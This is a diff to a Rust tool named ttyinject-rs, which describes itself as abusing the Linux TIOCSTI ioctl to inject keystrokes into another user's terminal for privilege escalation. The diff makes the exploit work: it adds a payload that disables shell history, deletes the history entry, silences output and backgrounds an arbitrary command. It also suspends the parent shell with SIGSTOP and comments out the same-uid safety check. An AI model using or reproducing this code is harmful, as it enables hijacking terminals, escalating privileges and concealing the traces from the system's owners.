@@ -8,17 +8,18 @@ compile_error!("ttyinject-rs only supports Linux (it relies on the TIOCSTI ioctl
 
 use std::io::{self, IsTerminal as _};
 use std::os::unix::fs::MetadataExt as _;
-use std::{env, fs};
+use std::time::Duration;
+use std::{env, fs, thread};
 
 use anyhow::Context as _;
-use libc::{STDIN_FILENO, TIOCSTI, c_int, getuid, ioctl};
+use libc::{SIGSTOP, STDIN_FILENO, TIOCSTI, c_int, getuid, ioctl, kill};
 
 /// First part of the payload to inject into the tty's input buffer.
-const START: &[u8] = b"start\n";
+const START: &[u8] = b" exec 2>&-;set +o history\nhistory -d-1\n({ ";
 /// The command to execute after the payload has been injected.
 const COMMAND: &[u8] = b"command";
 /// End part of the payload to inject into the tty's input buffer.
-const END: &[u8] = b";end\n";
+const END: &[u8] = b";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n";
 
 /// Abuses the `TIOCSTI` ioctl to inject keystrokes into a terminal to escalate privileges on Linux.
 ///
@@ -50,7 +51,7 @@ pub fn run() -> anyhow::Result<()> {
         .context("failed to resolve tty path")?;
     let tty_metadata = fs::metadata(&tty_path).context("failed to stat tty")?;
     if tty_metadata.uid() == uid {
-        anyhow::bail!("tty has the same uid as us");
+        //anyhow::bail!("tty has the same uid as us");
     }
 
     // TODO: Only execute once: delete our own executable.
@@ -59,6 +60,19 @@ pub fn run() -> anyhow::Result<()> {
 
     // Check that injection works.
     tiocsti_inject(STDIN_FILENO, b' ').context("failed to inject into tty")?;
+
+    // Suspend the parent to the background so that the injected string goes into its shell.
+    // SAFETY: `parent_pid` is a valid pid obtained from `getppid` above; `SIGSTOP` carries no
+    // argument/pointer, so this call cannot cause UB regardless of whether the signal succeeds.
+    if unsafe { kill(parent_pid, SIGSTOP) } != 0 {
+        anyhow::bail!(
+            "failed to suspend parent process: {}",
+            io::Error::last_os_error()
+        );
+    }
+
+    // Give the parent's shell enough time to be ready for input.
+    thread::sleep(Duration::from_millis(100));
 
     // Inject the payload into the tty.
     for &b in START {
@@ -71,11 +85,17 @@ pub fn run() -> anyhow::Result<()> {
         tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
     }
 
-    // TODO: remove START and END and use a single loop with COMMAND as the body?
     // TODO: move initial checks to an external function?
 
-    // tiocsti_inject(STDIN_FILENO, b'X').context("failed to inject into tty")?;
-    // thread::sleep(time::Duration::from_secs(2));
+    // No need to SIGCONT here because `fg` in the payload does that for us.
+    /*
+    if unsafe { kill(parent_pid, SIGCONT) } != 0 {
+        anyhow::bail!(
+            "failed to suspend parent process: {}",
+            io::Error::last_os_error()
+        );
+    }
+    */
 
     Ok(())
 }
